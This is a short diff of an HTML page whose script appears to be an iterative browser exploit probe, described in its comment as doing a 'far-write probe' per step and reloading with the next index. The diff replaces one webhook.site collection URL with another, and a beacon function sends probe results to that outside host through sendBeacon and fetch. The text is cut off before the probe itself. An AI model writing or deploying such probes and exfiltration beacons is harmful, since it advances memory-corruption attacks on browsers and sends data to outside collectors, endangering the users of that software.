@@ -1,6 +1,6 @@
 <html><body><script>
 // r4: URL-state iteration test. Reads k from query, does one far-write probe, then navigates to k+1.
-var SINK='https://webhook.site/4d4116b3-9a45-4992-b92f-e94487739e32';
+var SINK='https://webhook.site/33e6495b-c06f-431c-9e2c-938e6ffa810c';
 function beacon(t,v){ try{ navigator.sendBeacon(SINK+'/b?t='+encodeURIComponent(t)+'&k='+encodeURIComponent(String(v)).slice(0,40), ''); }catch(e){} try{ fetch(SINK+'?t='+encodeURIComponent(t)+'&v='+encodeURIComponent(String(v).slice(0,120)),{mode:'no-cors'});}catch(e){} }
 var q={}; var m; var re=/[?&]([^=&]+)=([^&]*)/g; while((m=re.exec(location.search))) q[decodeURIComponent(m[1])]=decodeURIComponent(m[2]);
 var k=parseInt(q.k||'0',10)||0;
